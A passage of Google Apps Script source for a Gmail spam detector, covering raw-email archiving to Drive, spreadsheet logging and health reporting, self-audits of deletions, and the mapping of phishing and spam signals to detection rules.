 * @return {Object} {archived: boolean, driveUrl: string}
 */
function archiveRawEml(messageId, rawContent, logType)
{
  const result = { archived: false, driveUrl: '' };

  if (!rawContent)
  {
    logError('No raw content to archive for ' + messageId);
    return result;
  }

  try
  {
    const props   = PropertiesService.getScriptProperties();
    const folderId = props.getProperty('SPAM_LOG_FOLDER_ID');
    if (!folderId)
    {
      logError('SPAM_LOG_FOLDER_ID unset — run setupLogging(). Nothing will be ' +
               'permanently deleted until the archive is reachable.');
      return result;
    }

    const rootFolder = DriveApp.getFolderById(folderId);
    const subfolder  = getOrCreateLogSubfolder(rootFolder,
      [logType === 'FALSE_NEGATIVE' ? 'False Negatives' : 'Detected']);

    const safeTs   = new Date().toISOString().replace(/:/g, '-').replace(/\.\d+Z$/, 'Z');
    const filename = safeTs + '_' + String(messageId).substring(0, 8) + '.eml';
    const fileUrl  = subfolder.createFile(
      Utilities.newBlob(rawContent, 'message/rfc822', filename)).getUrl();

    result.archived = true;
    result.driveUrl = '=HYPERLINK("' + fileUrl + '","' + filename + '")';
  }
  catch (e)
  {
    logError('Drive archive failed for ' + messageId + ': ' + e.toString());
  }

  return result;
}

/**
 * Write all pending log entries to Drive (EML files) and Sheets (rows).
 *
 * Called once at the end of processInbox(), after all deletions are complete.
 * Batches all Sheets rows into a single setValues() call. Drive writes are
 * sequential (one file per entry) since Drive has no batch creation API.
 *
 * Non-blocking: errors are caught and logged; spam detection is unaffected.
 * The finally block always clears _pendingLogEntries to prevent memory growth.
 */
/**
 * Write last-run health to a 'Health' tab: ONE row, overwritten each time.
 *
 * console.error/console.log were supposed to carry this, and they do not reach
 * anywhere readable. Apps Script sends them to Cloud Logging under the GCP
 * project attached to the script, and this script uses the auto-created default
 * project — confirmed empirically: the project named in .clasp.json has never
 * received a single log entry, and the Apps Script API refuses processes.list
 * without the script.processes scope. Attaching a standard GCP project is a
 * manual console procedure with an OAuth consent screen attached to it.
 *
 * The Sheet, meanwhile, is already configured, already written to, and already
 * readable with credentials that exist. So health goes there.
 *
 * Overwritten rather than appended: this is a gauge, not a log. A 1-minute
 * trigger would add 1,440 rows a day and bury the detection log it shares a
 * spreadsheet with. Staleness is the signal — if LastRunAt is older than a few
 * minutes, the detector is not running.
 *
 * Throttled: a quiet run rewrites at most every HEALTH_INTERVAL_MS, so the
 * common case costs no Sheets call at all. Anything eventful (work done, an
 * error, an audit finding) always writes immediately.
 */
function writeHealthRow(stats)
{
  const HEALTH_INTERVAL_MS = 5 * 60 * 1000;

  try
  {
    const props    = PropertiesService.getScriptProperties();
    // A VERSION CHANGE counts as eventful.
    //
    // Without this the throttle held the previous version's health signal for
    // up to HEALTH_INTERVAL_MS after a deploy, so anything checking "is the new
    // version live and healthy?" saw the OLD version and had to either poll for
    // five minutes or report a failure that was really just staleness. A
    // post-deploy check built on that is flaky, and flaky checks get ignored.
    //
    // The first run on new code is also the run most worth reporting.
    const lastVersion  = props.getProperty('LAST_HEALTH_VERSION');
    const versionMoved = lastVersion !== SCRIPT_VERSION;

    const eventful = stats.processed > 0 || stats.spam > 0 ||
                     stats.errors > 0 || stats.auditFindings > 0 ||
                     !!stats.runError || versionMoved;
    const lastAt   = parseInt(props.getProperty('LAST_HEALTH_WRITE_MS') || '0', 10);

    if (!eventful && Date.now() - lastAt < HEALTH_INTERVAL_MS) return;

    // THREW outranks everything: the run did not complete, so its other
    // counters are partial and must not read as a clean result.
    const status = stats.runError            ? 'THREW'
                 : stats.auditFindings > 0   ? 'AUDIT_FINDINGS'
                 : stats.errors > 0          ? 'ERRORS'
                 : 'OK';

    // Marker FIRST, and independent of the spreadsheet.
    //
    // It used to run after the Sheet write, behind the SPAM_LOG_SHEET_ID guard,
    // so a missing or broken spreadsheet silently took the machine-readable
    // health signal down with it. That is exactly backwards: the moment the
    // Sheet is misconfigured is the moment you most need to be told.
    updateHealthMarker(props, status);
    props.setProperty('LAST_HEALTH_WRITE_MS', String(Date.now()));
    props.setProperty('LAST_HEALTH_VERSION', SCRIPT_VERSION);

    const sheetId = props.getProperty('SPAM_LOG_SHEET_ID');
    if (!sheetId) return;   // no spreadsheet configured; the marker still went out

    const ss = SpreadsheetApp.openById(sheetId);
    let sheet = ss.getSheetByName('Health');
    if (!sheet)
    {
      sheet = ss.insertSheet('Health');
      sheet.setFrozenRows(1);
    }

    // Header and data written TOGETHER, every time, in one call.
    //
    // Writing the header only when creating the tab meant an existing tab kept
    // whatever schema it was created with: v6.58.0 made a 7-column header, and
    // v6.58.1 then wrote 8 values into row 2, leaving LastError as an unlabelled
    // column H. Writing both rows is the same number of Sheets calls and makes
    // the tab self-healing whenever this schema changes again.
    sheet.getRange(1, 1, 2, 8).setValues([
      ['LastRunAt', 'Version', 'Status', 'Processed', 'SpamActioned',
       'RunErrors', 'AuditFindings', 'LastError'],
      [new Date().toISOString(), SCRIPT_VERSION, status,
       stats.processed, stats.spam, stats.errors, stats.auditFindings,
       escapeSheetCell(String(stats.runError || '').substring(0, 500))]
    ]);
  }
  catch (e)
  {
    // Never let the health gauge break the run it is reporting on.
    logError('writeHealthRow failed (non-fatal): ' + e.toString());
  }
}

/**
 * Publish health into a Drive file's NAME, so it can be read with no setup.
 *
 * The Health tab is the surface a human reads. This is the one a script can
 * read, and the distinction is not academic — getting an automated checker to
 * see the Health tab turned out to require credentials nobody has lying around:
 *
 *   - Logger.log goes to the Apps Script transcript, which the Apps Script API
 *     will not serve without the script.processes scope (403).
 *   - console.* goes to Cloud Logging under the script's attached GCP project.
 *     This script uses the auto-created default project, and the project named
 *     in .clasp.json has never received a log entry. Attaching a standard one
 *     is a manual console procedure with an OAuth consent screen.
 *   - The Sheets API is not enabled for clasp's own OAuth client, so reading
 *     the Health tab needs a separately minted token. Asking a human to
 *     hand-craft an access token before they can ask "is it running?" is not a
 *     health check.
 *
 * Drive metadata, however, IS readable with exactly the credentials
 * `clasp login` already produces. A file name is metadata. So the status goes
 * in the name and the checker reads it for free.
 *
 * ONE file, renamed in place — the id is kept in Script Properties so this
 * never accumulates copies. Its content stays empty; only the name matters.
 */
function updateHealthMarker(props, status)
{
  try
  {
    const name = 'SpamDetector_health_' + status + '_v' + SCRIPT_VERSION +
                 '_' + new Date().toISOString();

    const existingId = props.getProperty('HEALTH_MARKER_FILE_ID');
    if (existingId)
    {
      try { DriveApp.getFileById(existingId).setName(name); return; }
      catch (e) { /* deleted or inaccessible — fall through and recreate */ }
    }

    const rootFolderId = props.getProperty('SPAM_LOG_FOLDER_ID');
    if (!rootFolderId) return;

    const file = DriveApp.getFolderById(rootFolderId).createFile(name, '');
    props.setProperty('HEALTH_MARKER_FILE_ID', file.getId());
  }
  catch (e)
  {
    logError('updateHealthMarker failed (non-fatal): ' + e.toString());
  }
}

/**
 * Queue an audit row. Synthesized rather than derived from a message, because
 * the message an audit concerns may already be permanently deleted.
 *
 * @param {string} logType - 'AUDIT_LOG_GAP' or 'AUDIT_SPAM_NOT_ACTIONED'.
 * @param {string} detail  - Human-readable finding; lands in the Subject column.
 */
function queueAuditRow(logType, detail)
{
  _pendingLogEntries.push({
    driveUrl: '', archived: false,
    detectedAt: new Date().toISOString(),
    logType:   logType,
    messageId: '', threadId: '',
    subject:          detail,
    fromDisplayName:  'SpamDetector self-audit',
    fromAddress:      '', sendingDomain: '', replyTo: '',
    ruleInfo:        { rule: 'AUDIT', description: 'Automated prod invariant check' },
    clickbaitCount:   0,
    signalsCsv:       '',
    bulkEmailService: false,
    hasAttachment:    false,
    listUnsubscribePresent: false
  });
}

/**
 * Verify, in production, that the detector actually did what it believes it did.
 *
 * Runs at the end of every processInbox(). Costs no Gmail API calls — it reads
 * only tallies already accumulated during the run.
 *
 * Two invariants, both chosen because their violation has actually shipped here
 * and neither was detectable without a human reading the mailbox or the Sheet:
 *
 *   1. LOG PARITY — every permanently deleted message has a Sheet row. The
 *      standing requirement is that all spam is logged, and deletion is
 *      irreversible, so an unlogged delete destroys the only record that it
 *      happened. Violated whenever a delete path skips accumulateLogEntry().
 *
 *   2. SPAM ACTIONED — phase 2 left no aged, non-whitelisted mail behind. This
 *      is the "is prod acting on the Spam folder at all?" check. Six messages
 *      sat through two releases intended to remove them; every test passed
 *      green throughout, because no test and no alert looked at the folder.
 *
 * Findings go to the SHEET, not just logError. An earlier lesson in this
 * project is that logError reaches only the Apps Script transcript, which
 * nobody reads — so a silent failure stayed silent. The Sheet is the surface
 * the user actually looks at, so that is where a broken invariant belongs.
 *
 * Deliberately non-throwing: an audit that breaks the run it audits is worse
 * than the bug it reports.
 */
function auditRunIntegrity()
{
  try
  {
    let findings = 0;

    const unlogged = _destroyedMessageIds.filter(function (id) {
      return _loggedMessageIds.indexOf(id) === -1;
    });

    if (unlogged.length > 0)
    {
      const detail = 'LOG GAP: ' + unlogged.length + ' message(s) permanently ' +
                     'deleted with no Sheet row — ids: ' + unlogged.join(', ');
      logError('AUDIT FAILED — ' + detail);
      queueAuditRow('AUDIT_LOG_GAP', detail);
      findings++;
    }

    if (_unresolvedAgedSpam > 0)
    {
      const detail = 'SPAM NOT ACTIONED: ' + _unresolvedAgedSpam + ' aged, ' +
                     'non-whitelisted Spam-folder thread(s) were neither ' +
                     'deleted nor spared this run';
      logError('AUDIT FAILED — ' + detail);
      queueAuditRow('AUDIT_SPAM_NOT_ACTIONED', detail);
      findings++;
    }

    // Flush only when the audit itself queued something. flushSpamLog() already
    // no-ops on an empty buffer, but being explicit keeps the intent readable:
    // a clean audit writes nothing at all.
    if (_pendingLogEntries.length > 0) flushSpamLog();

    return findings;
  }
  catch (auditError)
  {
    logError('auditRunIntegrity failed (non-fatal): ' + auditError.toString());
    return 0;
  }
}

function flushSpamLog()
{
  if (_pendingLogEntries.length === 0) return;

  try
  {
    const props        = PropertiesService.getScriptProperties();
    const rootFolderId = props.getProperty('SPAM_LOG_FOLDER_ID');
    const sheetId      = props.getProperty('SPAM_LOG_SHEET_ID');

    if (!rootFolderId || !sheetId)
    {
      logInfo('Spam logging not configured — run setupLogging() to enable it');
      return;
    }

    let rootFolder;
    try { rootFolder = DriveApp.getFolderById(rootFolderId); }
    catch (e)
    {
      logError('Spam log Drive folder not found: ' + e.toString());
      return;
    }

    let sheet;
    try
    {
      const ss = SpreadsheetApp.openById(sheetId);
      sheet = ss.getSheetByName('Raw Log');
      if (!sheet) throw new Error('"Raw Log" tab not found in spreadsheet');
    }
    catch (e)
    {
      logError('Spam log spreadsheet unavailable: ' + e.toString());
      return;
    }

    const detectedFolder = getOrCreateLogSubfolder(rootFolder, ['Detected']);
    let   fnFolder       = null; // Created on demand — only when a false negative is present

    const rows = [];

    for (let i = 0; i < _pendingLogEntries.length; i++)
    {
      const entry = _pendingLogEntries[i];

      // The EML was already written by archiveRawEml() BEFORE disposal, so
      // this loop only builds the Sheets row.
      const driveUrl = entry.driveUrl || '';

      // Columns F-H and J carry attacker-controlled text; see escapeSheetCell().
      // driveUrl is constructed by this code, not the attacker, and must stay a
      // live =HYPERLINK formula.
      rows.push([
        entry.detectedAt,
        entry.logType,
        entry.messageId,
        entry.threadId,
        driveUrl,
        escapeSheetCell(entry.subject),
        escapeSheetCell(entry.fromDisplayName),
        escapeSheetCell(entry.fromAddress),
        entry.sendingDomain,
        entry.replyTo,
        entry.ruleInfo.rule,
        entry.ruleInfo.description,
        entry.clickbaitCount,
        entry.signalsCsv,
        entry.bulkEmailService,
        entry.hasAttachment,
        entry.listUnsubscribePresent,
        '', // False Negative Notes (filled in manually by user)
        ''  // Notes (general free-form)
      ]);
    }

    // Single Sheets write for all rows — more efficient than one appendRow() per entry
    if (rows.length > 0)
    {
      sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, rows[0].length).setValues(rows);
      logInfo('Logged ' + rows.length + ' spam intelligence ' +
              (rows.length === 1 ? 'entry' : 'entries'));
    }
  }
  catch (error)
  {
    logError('flushSpamLog failed: ' + error.toString());
  }
  finally
  {
    _pendingLogEntries = []; // Always clear — prevents memory growth between runs
  }
}

/**
 * Get or create a chain of nested subfolders under a Drive parent folder.
 *
 * Given rootFolder and ['Detected'], returns the "Detected" subfolder,
 * creating it if missing. Supports deeper paths too: ['a', 'b', 'c'].
 *
 * @param {DriveFolder}   rootFolder   - Starting parent folder.
 * @param {Array<string>} pathSegments - Folder names to traverse/create in order.
 * @return {DriveFolder} The deepest folder at the end of the path.
 */
function getOrCreateLogSubfolder(rootFolder, pathSegments)
{
  let current = rootFolder;
  for (let i = 0; i < pathSegments.length; i++)
  {
    const name     = pathSegments[i];
    const existing = current.getFoldersByName(name);
    current        = existing.hasNext() ? existing.next() : current.createFolder(name);
  }
  return current;
}

/**
 * Derive which detection rule fired from a signals object.
 *
 * Mirrors the rule cascade in makeVerdict() exactly — must be kept in sync
 * if makeVerdict() rules change. Returns rule 'NONE' for false negatives or
 * any signals object where no rule matched.
 *
 * @param {Object|null} signals - Signal object from collectSignals(), or null.
 * @return {{rule: string, description: string}}
 */
function getRuleFromSignals(signals)
{
  if (!signals)
  {
    // NOT "false negative". null means no signals were collected at all, and
    // every live caller that passes null is a DELIBERATE disposition, not a
    // miss: GMAIL_SPAM_EXPIRED (aged out on Gmail's verdict) and
    // SPAM_MISSED_REFUSED_WHITELISTED (a refusal). Labelling those "false
    // negative" in the Sheet asserted the detector had failed on mail it had
    // judged correctly on purpose — which is exactly how a whitelisted
    // LinkedIn keep came to be filed as a detection failure. An actual false
    // negative carries real signals, because it is re-scored before logging.
    return { rule: 'NONE', description: 'Not rule-based — see log type' };
  }

  if (signals.bulkEmailService && signals.blacklistedSender)
  {
    return { rule: 'Rule 1', description: 'Bulk email + blacklisted sender' };
  }

  if (signals.bulkEmailService && signals.clickbaitCount >= 2)
  {
    return { rule: 'Rule 2', description: 'Bulk email + clickbait (' + signals.clickbaitCount + ' patterns)' };
  }

  let spamBehaviorCount = 0;
  if (signals.clickbaitCount >= 1)       spamBehaviorCount++;
  if (signals.fearMongering)             spamBehaviorCount++;
  if (signals.marketingFormat)           spamBehaviorCount++;
  if (signals.suspiciousFromName)        spamBehaviorCount++;

  if (signals.bulkEmailService && spamBehaviorCount >= 2)
  {
    return { rule: 'Rule 3', description: 'Bulk email + ' + spamBehaviorCount + ' spam behaviors' };
  }

  if (signals.clickbaitCount >= 3)
  {
    return { rule: 'Rule 4', description: 'Extreme clickbait (' + signals.clickbaitCount + ' patterns)' };
  }

  if (signals.emptySubjectWithAttachment)
  {
    return { rule: 'Rule 5', description: 'Empty subject with attachment (payload delivery scam)' };
  }

  if (signals.serviceImpersonation)
  {
    return { rule: 'Rule 6', description: 'Service impersonation phishing (cloud service subject from non-service sender)' };
  }

  // Must stay in the SAME position as in makeVerdict(). Rule order is the
  // contract — a branch in the wrong slot reports the wrong rule for any
  // message that trips two signals.
  if (signals.brandMismatchedCta)
  {
    return { rule: 'Rule 7', description: 'Brand-mismatched CTA phishing (link text names a document brand the destination does not control)' };
  }

  if (signals.freeMailRandomLocal && spamBehaviorCount >= 2)
  {
    return { rule: 'Rule 8', description: 'Free-mail machine-generated sender + ' + spamBehaviorCount + ' spam behaviors' };
  }

  if (signals.callbackPhishing)
  {
    return { rule: 'Rule 9', description: 'Callback phishing (free-mail sender invoicing as a brand it does not control, payload is a phone number)' };
  }

  return { rule: 'NONE', description: 'No rule triggered' };
}

/**
 * Format a signals object as a comma-separated list of active signal names.
 * Used for the "Signals Detected" column in the Sheets log.
 *
 * @param {Object|null} signals - Signal object from collectSignals(), or null.
 * @return {string} CSV string, e.g. "BULK,BLACKLISTED,CLICKBAIT(3),FEAR", or "".
 */
function buildSignalsCsv(signals)
{
  if (!signals) return '';

  const parts = [];
  if (signals.bulkEmailService)           parts.push('BULK');
  if (signals.blacklistedSender)          parts.push('BLACKLISTED');
  if (signals.clickbaitCount > 0)         parts.push('CLICKBAIT(' + signals.clickbaitCount + ')');
  if (signals.fearMongering)              parts.push('FEAR');
  if (signals.marketingFormat)            parts.push('MARKETING');
  if (signals.suspiciousFromName)         parts.push('SUSPICIOUS_FROM');
  if (signals.emptySubjectWithAttachment) parts.push('EMPTY_SUBJECT_ATTACHMENT');
  if (signals.serviceImpersonation)       parts.push('SERVICE_IMPERSONATION');
  if (signals.brandMismatchedCta)         parts.push('BRAND_MISMATCH_CTA');
  if (signals.freeMailRandomLocal)        parts.push('FREEMAIL_RANDOM_LOCAL');
  if (signals.callbackPhishing)           parts.push('CALLBACK_PHISHING');

  return parts.join(',');
}


// =============================================================================
// Debug Tools
// =============================================================================

/**
 * Debug tool — analyze why a specific email was flagged (or not flagged).
 *
 * Searches for an email matching the given term, then prints all detection
 * signals to the log. Useful for investigating false positives or missed spam.
 *
 * Run from the Apps Script editor with a search term:
 *   debugWhyFlagged('from:linkedin')
 *   debugWhyFlagged('subject:your order')
 *
 * @param {string} [searchTerm='from:linkedin'] - Gmail search query to find the email.
 */
function debugWhyFlagged(searchTerm)
{
  try
  {
    const search = searchTerm || 'from:linkedin';
    const threads = GmailApp.search(search, 0, 1);

    if (threads.length === 0)
    {
      logInfo('No email found for: ' + search);
      return;
    }

    const message = threads[0].getMessages()[0];

    logInfo('=== DEBUG: WHY FLAGGED? ===');
    logInfo('Subject: ' + message.getSubject());
    logInfo('From: ' + message.getFrom());
    logInfo('');

    // Run the real production signal collection — guaranteed to match runtime behavior
    const signals = collectSignals(message);

    if (signals === null)
    {
      logInfo('✓ WHITELISTED — detection skipped entirely');
    }
    else
    {
      logInfo('Signals:');
      logInfo('  bulk=' + signals.bulkEmailService);
      logInfo('  blacklist=' + signals.blacklistedSender);
      logInfo('  clickbait=' + signals.clickbaitCount);
      logInfo('  fear=' + signals.fearMongering);
      logInfo('  marketing=' + signals.marketingFormat);
      logInfo('  suspiciousFrom=' + signals.suspiciousFromName);
      logInfo('  emptySubjectAttachment=' + signals.emptySubjectWithAttachment);
      // serviceImpersonation was missing since v6.38.0 — a Rule 6 phishing
      // verdict printed "SPAM" with every listed signal false, in the one tool
      // whose entire job is explaining why something was flagged.
      logInfo('  serviceImpersonation=' + signals.serviceImpersonation);
      logInfo('  brandMismatchedCta=' + signals.brandMismatchedCta);
      logInfo('  freeMailRandomLocal=' + signals.freeMailRandomLocal);
      logInfo('');
      logInfo('Verdict: ' + (makeVerdict(signals) ? 'SPAM' : 'not spam'));
    }

    logInfo('=== END DEBUG ===');
  }
  catch (error)
  {
    logError('Debug failed: ' + error.toString());
  }
}
